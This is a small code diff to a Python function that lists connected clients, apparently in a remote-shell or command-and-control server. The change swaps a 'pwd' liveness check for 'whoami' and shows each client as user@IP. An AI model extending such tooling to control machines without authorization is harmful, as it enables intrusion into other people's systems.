@@ -312,19 +312,16 @@ def list_clients():
     i = 0
     for client in CURRENT_CONNECTIONS_CLASS:
         try:
-            cwd = None
-            if not client.send('pwd'):
+            if not client.send('whoami'):
                 raise Exception
-            cwd = client.recv()
-            client.send('whoami')
             whoami = client.recv().strip()
-            if cwd is None or cwd == "":
+            if whoami is None or whoami == "":
                 removeClient(client)
         except:
             removeClient(client)
             continue
 
-        results += str(i) + " - " + whoami + "@" + str(client.IP) + ":" + str(client.port) + ":" + str(cwd) + "\n"
+        results += str(i) + " - " + whoami + "@" + str(client.IP) + "\n"
         i+=1
 
     if len(CURRENT_CONNECTIONS_CLASS) != 0:
